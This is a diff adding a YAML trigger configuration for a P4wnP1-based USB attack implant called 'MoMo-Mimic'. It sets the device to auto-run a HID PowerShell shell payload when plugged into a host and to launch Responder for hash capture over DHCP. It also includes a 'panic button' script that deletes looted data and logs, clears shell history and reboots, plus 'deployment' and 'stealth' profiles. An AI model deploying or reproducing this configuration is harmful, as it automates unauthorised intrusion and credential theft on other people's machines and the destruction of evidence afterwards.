@@ -1,0 +1,187 @@
+# ═══════════════════════════════════════════════════════════════════════════
+# MoMo-Mimic Trigger Configuration
+# P4wnP1 A.L.O.A. Event-Based Actions
+# ═══════════════════════════════════════════════════════════════════════════
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Trigger Types Available:
+#   - USB_GADGET_CONNECTED      : When device plugged into host
+#   - USB_GADGET_DISCONNECTED   : When device unplugged
+#   - WIFI_AP_STA_CONNECTED     : When client connects to AP
+#   - WIFI_AP_STA_DISCONNECTED  : When client disconnects from AP
+#   - GPIO_IN                   : GPIO pin state change
+#   - SSH_LOGIN                 : SSH session started
+#   - DHCP_LEASE_GRANTED        : Client gets IP via DHCP
+# ─────────────────────────────────────────────────────────────────────────────
+
+triggers:
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # AUTO-ATTACK ON USB CONNECT
+  # ═══════════════════════════════════════════════════════════════════════════
+  - name: "auto_attack_on_connect"
+    description: "Run HID attack when plugged into host"
+    enabled: true
+    
+    trigger:
+      type: "USB_GADGET_CONNECTED"
+      
+    action:
+      type: "RUN_HIDSCRIPT"
+      script: "payloads/windows/shell_powershell.js"
+      
+    # Optional delay before running
+    delay_ms: 2000
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # OPERATOR WIFI NOTIFICATION
+  # ═══════════════════════════════════════════════════════════════════════════
+  - name: "operator_connected"
+    description: "Notification when operator connects to WiFi"
+    enabled: true
+    
+    trigger:
+      type: "WIFI_AP_STA_CONNECTED"
+      
+    action:
+      type: "RUN_BASHSCRIPT"
+      script: |
+        #!/bin/bash
+        # Log connection
+        echo "$(date): Operator connected - $WIFI_CLIENT_MAC" >> /var/log/momo-mimic.log
+        # Blink LED (if configured)
+        gpio -g write 17 1
+        sleep 0.1
+        gpio -g write 17 0
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # GPIO BUTTON TRIGGER
+  # ═══════════════════════════════════════════════════════════════════════════
+  - name: "panic_button"
+    description: "Emergency cleanup when button pressed"
+    enabled: false    # Enable if GPIO button installed
+    
+    trigger:
+      type: "GPIO_IN"
+      pin: 22
+      edge: "falling"   # Button press (pull-up resistor)
+      
+    action:
+      type: "RUN_BASHSCRIPT"
+      script: |
+        #!/bin/bash
+        # Emergency cleanup
+        echo "PANIC BUTTON PRESSED - WIPING DATA"
+        
+        # Stop all attacks
+        pkill -f "P4wnP1"
+        
+        # Clear sensitive data
+        rm -rf /home/pi/loot/*
+        rm -rf /var/log/P4wnP1/*
+        rm -rf /tmp/*
+        history -c
+        
+        # Blink LED rapidly
+        for i in {1..10}; do
+          gpio -g write 17 1
+          sleep 0.05
+          gpio -g write 17 0
+          sleep 0.05
+        done
+        
+        # Reboot into clean state
+        reboot
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # MANUAL HID TRIGGER (GPIO BUTTON)
+  # ═══════════════════════════════════════════════════════════════════════════
+  - name: "manual_attack_button"
+    description: "Run attack when GPIO button pressed"
+    enabled: false
+    
+    trigger:
+      type: "GPIO_IN"
+      pin: 27
+      edge: "falling"
+      
+    action:
+      type: "RUN_HIDSCRIPT"
+      script: "payloads/util/test_hid.js"
+      
+    # Debounce to prevent multiple triggers
+    debounce_ms: 500
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # NETWORK ATTACK ON DHCP
+  # ═══════════════════════════════════════════════════════════════════════════
+  - name: "responder_on_network"
+    description: "Start Responder when network gadget gets DHCP"
+    enabled: false
+    
+    trigger:
+      type: "DHCP_LEASE_GRANTED"
+      interface: "usb0"
+      
+    action:
+      type: "RUN_BASHSCRIPT"
+      script: |
+        #!/bin/bash
+        # Start Responder for hash capture
+        cd /usr/share/responder
+        python3 Responder.py -I usb0 -wrf &
+        
+        # Log
+        echo "$(date): Responder started on usb0" >> /var/log/momo-mimic.log
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CLEANUP ON DISCONNECT
+  # ═══════════════════════════════════════════════════════════════════════════
+  - name: "cleanup_on_disconnect"
+    description: "Clean up when unplugged from host"
+    enabled: true
+    
+    trigger:
+      type: "USB_GADGET_DISCONNECTED"
+      
+    action:
+      type: "RUN_BASHSCRIPT"
+      script: |
+        #!/bin/bash
+        # Stop any running attacks
+        pkill -f Responder
+        
+        # Clear temporary files
+        rm -rf /tmp/attack_*
+        
+        # Log disconnect
+        echo "$(date): Disconnected from host" >> /var/log/momo-mimic.log
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Trigger Profiles
+# Quick switch between different trigger configurations
+# ─────────────────────────────────────────────────────────────────────────────
+profiles:
+  # Testing - No auto attacks
+  testing:
+    enabled_triggers:
+      - operator_connected
+      
+  # Deployment - Full automation
+  deployment:
+    enabled_triggers:
+      - auto_attack_on_connect
+      - cleanup_on_disconnect
+      - operator_connected
+      
+  # Stealth - Minimal footprint
+  stealth:
+    enabled_triggers:
+      - panic_button
+      - cleanup_on_disconnect
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Active Profile
+# ─────────────────────────────────────────────────────────────────────────────
+active_profile: "testing"
+
